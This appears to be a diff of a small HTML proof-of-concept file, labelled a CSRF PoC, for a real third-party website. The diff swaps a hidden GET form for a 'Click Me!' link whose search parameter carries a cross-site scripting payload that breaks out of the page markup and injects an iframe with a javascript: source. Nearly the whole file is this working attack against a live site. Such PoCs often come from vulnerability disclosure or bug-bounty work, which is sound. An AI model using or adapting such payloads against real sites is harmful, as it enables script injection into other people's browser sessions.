@@ -1,10 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 	<body>
-		<h1>Form CSRF PoC</h1>
-		<form method="GET" action="https://chainstack.com/">
-			<input type="hidden" name="s" value="xss%22t-->[[<iframe/src">
-			<input type="submit" value="Submit Request">
-		</form>
+		<h1>Link CSRF PoC</h1>
+		<a href="https://chainstack.com/?s=xss%22t-->[[<iframe/src=javascript:print>">Click Me!</a>
 	</body>
 </html>
